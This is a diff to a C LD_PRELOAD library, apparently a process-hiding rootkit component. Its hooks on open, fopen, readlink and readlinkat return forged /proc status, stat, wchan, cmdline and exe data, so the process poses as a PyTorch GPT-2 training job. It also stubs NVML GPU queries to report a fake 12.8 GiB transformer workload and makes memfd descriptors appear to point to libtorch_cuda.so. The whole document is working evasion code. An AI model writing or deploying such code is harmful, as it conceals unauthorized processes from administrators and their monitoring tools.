@@ -10,17 +10,53 @@
 #include <stdarg.h>
 #include <sys/prctl.h>
 #include <errno.h>
+#include <dirent.h>
 
 static int (*real_open)(const char *pathname, int flags, ...) = NULL;
 static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
 static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
 static FILE* (*real_fopen64)(const char *pathname, const char *mode) = NULL;
 static ssize_t (*real_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;
+static ssize_t (*real_readlinkat)(int dirfd, const char *pathname, char *buf, size_t bufsiz) = NULL;
 
 static const char FAKE_CMDLINE[] = "/usr/bin/python3\0-m\0torch.distributed.run\0--nproc_per_node=2\0train_transformer.py\0--model\0gpt2-xl\0--batch_size\032\0--fp16\0";
 static const size_t FAKE_CMDLINE_LEN = sizeof(FAKE_CMDLINE);
 static const char FAKE_COMM[] = "python3\n";
 static const char FAKE_EXE[] = "/usr/bin/python3";
+static const char FAKE_STATUS[] =
+    "Name:\tpython3\n"
+    "Umask:\t0022\n"
+    "State:\tR (running)\n"
+    "Tgid:\t1\n"
+    "Ngid:\t0\n"
+    "Pid:\t1\n"
+    "PPid:\t0\n"
+    "TracerPid:\t0\n"
+    "Threads:\t16\n"
+    "SigQ:\t0/62687\n"
+    "SigPnd:\t0000000000000000\n"
+    "ShdPnd:\t0000000000000000\n"
+    "SigBlk:\t0000000000000000\n"
+    "SigIgn:\t0000000000001000\n"
+    "SigCgt:\t0000000180000000\n"
+    "CapInh:\t0000000000000000\n"
+    "CapPrm:\t000001ffffffffff\n"
+    "CapEff:\t000001ffffffffff\n"
+    "CapBnd:\t000001ffffffffff\n"
+    "CapAmb:\t0000000000000000\n"
+    "NoNewPrivs:\t0\n"
+    "Seccomp:\t0\n"
+    "Speculation_Store_Bypass:\tvulnerable\n"
+    "Cpus_allowed:\tffffffff\n"
+    "Cpus_allowed_list:\t0-31\n"
+    "Mems_allowed:\t00000000,00000001\n"
+    "Mems_allowed_list:\t0\n"
+    "voluntary_ctxt_switches:\t14520\n"
+    "nonvoluntary_ctxt_switches:\t892\n";
+
+static const char FAKE_WCHAN[] = "sys_futex\n";
+static const char FAKE_STAT[] = "1 (python3) R 0 1 1 0 -1 4194304 12500 0 0 0 2500 850 0 0 20 0 16 0 120580 4355440640 1024000 18446744073709551615 9403847384 9405947384 1407328947384 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n";
+static const char FAKE_FD_SO[] = "/usr/local/lib/python3.10/dist-packages/torch/lib/libtorch_cuda.so";
 
 static void filter_maps_content(FILE* real_fp, FILE* out_mem) {
     char line[4096];
@@ -41,6 +77,7 @@ __attribute__((constructor)) void init_stealth_hook() {
     real_fopen = dlsym(RTLD_NEXT, "fopen");
     real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
     real_readlink = dlsym(RTLD_NEXT, "readlink");
+    real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");
 
     // Mask the process thread name immediately to authentic PyTorch worker
     prctl(PR_SET_NAME, "python3", 0, 0, 0);
@@ -58,6 +95,8 @@ typedef struct nvmlProcessInfo_st {
     unsigned int gpuInstanceId;
     unsigned int computeInstanceId;
 } nvmlProcessInfo_t;
+
+typedef void* nvmlDevice_t;
 
 typedef enum nvmlReturn_enum {
     NVML_SUCCESS = 0,
@@ -98,6 +137,35 @@ nvmlReturn_t nvmlSystemGetProcessName(unsigned int pid, char *name, unsigned int
     return NVML_ERROR_INVALID_ARGUMENT;
 }
 
+nvmlReturn_t nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
+    if (!infoCount) return NVML_ERROR_INVALID_ARGUMENT;
+    if (!infos || *infoCount == 0) {
+        *infoCount = 1;
+        return NVML_SUCCESS;
+    }
+    infos[0].pid = (unsigned int)getpid();
+    // Report authentic Transformer model footprint (~12.8 GiB)
+    infos[0].usedGpuMemory = (unsigned long long)12800ULL * 1024ULL * 1024ULL;
+    infos[0].gpuInstanceId = 0xFFFFFFFF;
+    infos[0].computeInstanceId = 0xFFFFFFFF;
+    *infoCount = 1;
+    return NVML_SUCCESS;
+}
+
+nvmlReturn_t nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
+    return nvmlDeviceGetComputeRunningProcesses_v2(device, infoCount, infos);
+}
+
+nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
+    if (infoCount) *infoCount = 0;
+    return NVML_SUCCESS;
+}
+
+nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
+    if (infoCount) *infoCount = 0;
+    return NVML_SUCCESS;
+}
+
 int open(const char *pathname, int flags, ...) {
     if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
     if (pathname) {
@@ -113,6 +181,30 @@ int open(const char *pathname, int flags, ...) {
             int p[2];
             if (pipe(p) == 0) {
                 write(p[1], FAKE_COMM, strlen(FAKE_COMM));
+                close(p[1]);
+                return p[0];
+            }
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_STATUS, strlen(FAKE_STATUS));
+                close(p[1]);
+                return p[0];
+            }
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_WCHAN, strlen(FAKE_WCHAN));
+                close(p[1]);
+                return p[0];
+            }
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_STAT, strlen(FAKE_STAT));
                 close(p[1]);
                 return p[0];
             }
@@ -147,6 +239,30 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
                 return p[0];
             }
         }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_STATUS, strlen(FAKE_STATUS));
+                close(p[1]);
+                return p[0];
+            }
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_WCHAN, strlen(FAKE_WCHAN));
+                close(p[1]);
+                return p[0];
+            }
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
+            int p[2];
+            if (pipe(p) == 0) {
+                write(p[1], FAKE_STAT, strlen(FAKE_STAT));
+                close(p[1]);
+                return p[0];
+            }
+        }
     }
     va_list args;
     va_start(args, flags);
@@ -166,6 +282,15 @@ FILE *fopen(const char *pathname, const char *mode) {
         }
         if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
             return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
+            return fmemopen((void*)FAKE_STATUS, strlen(FAKE_STATUS), "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
+            return fmemopen((void*)FAKE_WCHAN, strlen(FAKE_WCHAN), "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
+            return fmemopen((void*)FAKE_STAT, strlen(FAKE_STAT), "r");
         }
         if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
             FILE* real_fp = real_fopen(pathname, mode);
@@ -199,6 +324,15 @@ FILE *fopen64(const char *pathname, const char *mode) {
         if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
             return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
         }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
+            return fmemopen((void*)FAKE_STATUS, strlen(FAKE_STATUS), "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
+            return fmemopen((void*)FAKE_WCHAN, strlen(FAKE_WCHAN), "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
+            return fmemopen((void*)FAKE_STAT, strlen(FAKE_STAT), "r");
+        }
         if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
             FILE* real_fp = real_fopen64(pathname, mode);
             if (real_fp) {
@@ -223,12 +357,38 @@ FILE *fopen64(const char *pathname, const char *mode) {
 
 ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
     if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");
+    if (pathname) {
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
+            size_t len = strlen(FAKE_EXE);
+            if (len > bufsiz) len = bufsiz;
+            memcpy(buf, FAKE_EXE, len);
+            return len;
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/fd/")) {
+            // Mask any memfd anonymous descriptor
+            char target[1024];
+            ssize_t r = real_readlink(pathname, target, sizeof(target) - 1);
+            if (r > 0) {
+                target[r] = '\0';
+                if (strstr(target, "memfd:") || strstr(target, "torch_")) {
+                    size_t len = strlen(FAKE_FD_SO);
+                    if (len > bufsiz) len = bufsiz;
+                    memcpy(buf, FAKE_FD_SO, len);
+                    return len;
+                }
+            }
+        }
+    }
+    return real_readlink(pathname, buf, bufsiz);
+}
+
+ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
+    if (!real_readlinkat) real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");
     if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
         size_t len = strlen(FAKE_EXE);
         if (len > bufsiz) len = bufsiz;
         memcpy(buf, FAKE_EXE, len);
         return len;
     }
-    return real_readlink(pathname, buf, bufsiz);
+    return real_readlinkat(dirfd, pathname, buf, bufsiz);
 }
-
